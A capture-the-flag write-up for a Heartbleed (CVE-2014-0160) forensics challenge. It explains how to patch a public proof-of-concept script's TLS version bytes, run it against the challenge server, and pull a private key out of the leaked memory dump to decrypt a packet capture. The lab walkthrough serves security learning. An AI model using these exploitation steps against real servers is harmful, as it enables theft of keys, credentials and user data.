---
description: 'Category: Forensics (Easy)'
---

# Heartbleed

## Description

{% code overflow="wrap" %}
```
This is a simple challenge. Exploit the Heartbleed vulnerability, and obtain the flag from the network capture

Mirror 1: https://chall1.lagncra.sh:17091

Mirror 2: https://chall2.lagncra.sh:17091
```
{% endcode %}

## Walkthrough

We're provided with a network capture and a website. We can open this network capture in Wireshark

<figure><img src="../../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure>

There are a lot of TLS packets, which suggests that it could be encrypted HTTPS traffic. If we try to follow the data streams, we can't see anything of note since all the data is garbled.

<figure><img src="../../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>

Based on the challenge description, we're supposed to attack the provided HTTPS website using the Heartbleed CVE

<details>

<summary>Overview of Heartbleed (CVE-2014-0160)</summary>

This is a critical vulnerability in the OpenSSL cryptographic library, which allows any user on the Internet to read the memory of systems that have this vulnerable library running. The contents of memory can contain secret keys that are used to identify service providers and encrypt network traffic, credentials and data. Attackers that successfully exploit Heartbleed may be able to eavesdrop on communications, steal data directly from services and users and impersonate services and users



For more information about the Heartbleed CVE, readers can consult the official vulnerability page [here](https://www.heartbleed.com) ([https://www.heartbleed.com](https://www.heartbleed.com))

</details>

We're provided with a link to the challenge site, which we can access

<figure><img src="../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

The site provides us with a warning that the site is currently vulnerable to the Heartbleed vulnerability, and nothing else. There is no flag or login panel on this website, so we can try to dump the memory of the server in order to decrypt the provided network capture file.&#x20;

To do this, we can use publicly-available exploit scripts like Sensepost's Heartbleed [POC](https://github.com/sensepost/heartbleed-poc), linked here. If we try to run [heartbleed-poc.py](https://github.com/sensepost/heartbleed-poc/blob/master/heartbleed-poc.py), we immediately get an error message.

<figure><img src="../../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

The error message seems very cryptic, so what we can do to debug this is to open the script up in a text editor of our choice, and see what it does. For this example, I will be using the default text editor in Kali (Mousepad). Jumping to the function that prints the "received message" text, we can see the following code

```python
def recvmsg(s):
	hdr = recvall(s, 5)
	if hdr is None:
		print 'Unexpected EOF receiving record header - server closed connection'
		return None, None, None
	typ, ver, ln = struct.unpack('>BHH', hdr)
	pay = recvall(s, ln, 10)
	if pay is None:
		print 'Unexpected EOF receiving record payload - server closed connection'
		return None, None, None
	print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
	return typ, ver, pay
```

What this function does is read the first 5 bytes of data that was sent back from the webserver, and parse it as the header. If a header is received, the server will unpack the header and read the specified amount of bytes in the length field and read that amount of bytes. Unfortunately, the script doesnt provide much information about the type and version fields.&#x20;

To make debugging easier, we can open up a Wireshark capture and sniff the traffic being sent by the exploit script.

<figure><img src="../../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

We managed to capture the alert message sent back by the webserver, which tells us that there is a version mismatch with the original Client Hello. The value set in the version field is 0x0302, which translates to TLS 1.1 as seen in the Wireshark capture. If we attempt to curl the webserver, we can see what TLS version is being used

<figure><img src="../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

Based on the output provided, it can safely be assumed that the server is using TLS 1.2, which would thus correlate to 0x0303 in the version field. We can modify the original Client Hello message to use TLS 1.2 instead of TLS 1.1, keeping in mind to modify the payload twice since the incorrect version was specified twice

<figure><img src="../../.gitbook/assets/image (343).png" alt=""><figcaption><p>Wireshark packet dump showing which values to modify</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (344).png" alt=""><figcaption><p>The modified Hello payload. Circles indicate the values changed</p></figcaption></figure>

Now with our updated exploit script, we can run the exploit again to dump the server's memory. The command output has been copied below

```bash
┌──(kali㉿kali)-[~/Documents]
└─$ python2 heartbleed-poc.py chall1.lagncra.sh -p 17091
Scanning chall1.lagncra.sh on port 17091
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0303, length = 58
 ... received message: type = 22, ver = 0303, length = 929
 ... received message: type = 22, ver = 0303, length = 4
Server TLS version was 1.3

Sending heartbeat request...
 ... received message: type = 24, ver = 0303, length = 16384
Received heartbeat response:
  0000: 02 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00  .@..............
  0010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  <REDACTED FOR BREVITY>
  10c0: 00 00 00 00 2D 2D 2D 2D 2D 42 45 47 49 4E 20 50  ....-----BEGIN P
  10d0: 52 49 56 41 54 45 20 4B 45 59 2D 2D 2D 2D 2D 0A  RIVATE KEY-----.
  10e0: 4D 49 49 45 76 41 49 42 41 44 41 4E 42 67 6B 71  MIIEvAIBADANBgkq
  10f0: 68 6B 69 47 39 77 30 42 41 51 45 46 41 41 53 43  hkiG9w0BAQEFAASC
  1100: 42 4B 59 77 67 67 53 69 41 67 45 41 41 6F 49 42  BKYwggSiAgEAAoIB
  1110: 41 51 44 4A 70 4E 54 53 47 56 68 67 56 59 37 65  AQDJpNTSGVhgVY7e
  1120: 0A 54 33 59 35 6F 6A 47 6C 7A 4E 53 45 61 72 48  .T3Y5ojGlzNSEarH
  1130: 6A 55 79 6D 48 35 76 4B 47 36 2B 36 6C 59 51 6D  jUymH5vKG6+6lYQm
  1140: 73 51 36 46 54 65 42 62 59 67 68 52 64 50 54 53  sQ6FTeBbYghRdPTS
  1150: 59 44 53 61 4F 32 35 5A 63 76 4A 34 49 65 35 41  YDSaO25ZcvJ4Ie5A
  1160: 52 0A 73 54 55 31 73 6A 34 6A 65 65 42 31 65 76  R.sTU1sj4jeeB1ev
  1170: 47 77 63 72 37 43 54 6F 7A 4B 4E 75 4D 52 69 73  Gwcr7CTozKNuMRis
  1180: 36 51 52 59 70 67 37 67 7A 59 73 6B 52 70 57 67  6QRYpg7gzYskRpWg
  1190: 54 46 61 6A 6B 6E 50 38 4F 4E 50 6F 67 6E 64 6D  TFajknP8ONPogndm
  11a0: 70 52 0A 47 4D 78 6D 45 2B 68 4D 55 55 4D 33 6A  pR.GMxmE+hMUUM3j
  11b0: 4E 51 2B 73 4F 53 4B 43 43 79 7A 41 65 67 41 55  NQ+sOSKCCyzAegAU
  11c0: 48 33 38 6F 68 6A 72 6A 2B 6C 75 45 46 71 38 7A  H38ohjrj+luEFq8z
  11d0: 66 6D 48 53 45 55 32 63 5A 57 67 44 43 4F 72 6C  fmHSEU2cZWgDCOrl
  11e0: 6D 6F 41 0A 5A 6C 50 52 42 56 4B 55 6A 6A 5A 72  moA.ZlPRBVKUjjZr
  11f0: 36 47 61 47 59 59 4F 2B 52 64 63 42 33 38 38 52  6GaGYYO+RdcB388R
  <REDACTED FOR BREVITY>
  3f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3f90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3fa0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

WARNING: server chall1.lagncra.sh returned more data than it should - server is vulnerable!
```

Now we've confirmed the webserver is indeed vulnerable to Heartbleed, and the memory segments dumped contain secret keys. We can extract the keys from the dump file generated by the exploit script and import them into the capture file to decrypt the TLS traffic.

<figure><img src="../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

With the flag obtained, we can now submit this for our points

<figure><img src="../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

## Creator's Notes

To be honest, the script modification was not supposed to be in there. My original intentions were to have participants run the Heartbleed POC and call it a day. However, some unusual configurations led to the vulnerable service not working as intended, and hence requiring the modification to the script. Based on some participants' feedback, the Metasploit module works as expected, but I wasn't able to get it to work when I tried it.

If you're interested in trying out the Heartbleed CVE for yourself, I have published the source code for the challenge [here](https://github.com/Ryo-Soikutsu/Heartbleed). Have fun hacking!
